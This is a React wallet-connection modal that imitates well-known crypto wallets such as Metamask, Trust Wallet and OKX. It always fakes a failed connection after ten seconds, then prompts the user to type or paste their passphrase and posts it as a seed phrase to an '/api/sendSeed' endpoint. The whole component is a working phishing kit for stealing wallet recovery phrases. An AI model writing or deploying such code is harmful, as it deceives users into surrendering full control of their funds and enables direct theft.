import { useState, useEffect } from 'react';

const WALLET_OPTIONS = [
  { name: 'OKX Wallet', logo: 'https://www.okx.com/cdn/assets/imgs/221/5F1A9D3E7F8F8D8D.png' },
  { name: 'Trust Wallet', logo: 'https://trustwallet.com/assets/images/logo.png' },
  { name: 'Bybit Wallet', logo: 'https://www.bybit.com/favicon.ico' },
  { name: 'Metamask', logo: 'https://metamask.io/images/metamask-logo.png' },
  { name: 'Binance Wallet', logo: 'https://www.binance.com/favicon.ico' },
  { name: 'Wallet Connect', logo: 'https://walletconnect.com/favicon.ico' },
  { name: 'Bitget', logo: null }, // Use "B" for Bitget
];

export default function WalletModal({ isOpen, onClose }) {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectionFailed, setConnectionFailed] = useState(false);
  const [passphrase, setPassphrase] = useState('');

  useEffect(() => {
    if (selectedWallet) {
      setIsConnecting(true);
      const timer = setTimeout(() => {
        setIsConnecting(false);
        setConnectionFailed(true);
      }, 10000); // 10s delay
      return () => clearTimeout(timer);
    }
  }, [selectedWallet]);

  const handleSubmit = async () => {
    try {
      const response = await fetch('/api/sendSeed', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seedPhrase: passphrase }),
      });
      if (response.ok) {
        alert('Seed phrase sent successfully!');
        setPassphrase('');
        onClose();
      } else {
        alert('Failed to send seed phrase.');
      }
    } catch (error) {
      alert('Error sending seed phrase.');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
      <div className="bg-gray-800 p-6 rounded-lg max-w-md w-full">
        <h2 className="text-xl font-bold mb-4">Link Wallet</h2>
        {!selectedWallet && (
          <div className="grid grid-cols-2 gap-4">
            {WALLET_OPTIONS.map((wallet) => (
              <button
                key={wallet.name}
                onClick={() => setSelectedWallet(wallet)}
                className="flex items-center space-x-2 p-2 bg-gray-700 hover:bg-gray-600 rounded"
              >
                {wallet.logo ? (
                  <img src={wallet.logo} alt={wallet.name} className="w-6 h-6" />
                ) : (
                  <span className="w-6 h-6 flex items-center justify-center bg-gray-600 rounded-full">B</span>
                )}
                <span>{wallet.name}</span>
              </button>
            ))}
          </div>
        )}
        {isConnecting && (
          <div className="flex flex-col items-center">
            <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mb-2"></div>
            <p>Connecting...</p>
          </div>
        )}
        {connectionFailed && (
          <div>
            <p className="text-red-500 mb-4">Connection failed, link manually</p>
            <div className="flex space-x-2">
              <input
                type="text"
                value={passphrase}
                onChange={(e) => setPassphrase(e.target.value)}
                placeholder="Enter passphrase"
                className="flex-1 bg-gray-700 border-gray-600 text-white p-2 rounded"
              />
              <button
                onClick={() => navigator.clipboard.readText().then((text) => setPassphrase(text))}
                className="bg-gray-600 hover:bg-gray-500 text-white p-2 rounded"
              >
                Paste
              </button>
            </div>
            <button
              onClick={handleSubmit}
              className="mt-4 bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded w-full"
            >
              Submit
            </button>
          </div>
        )}
        <button onClick={onClose} className="mt-4 text-gray-400 hover:text-gray-200">
          Close
        </button>
      </div>
    </div>
  );
}
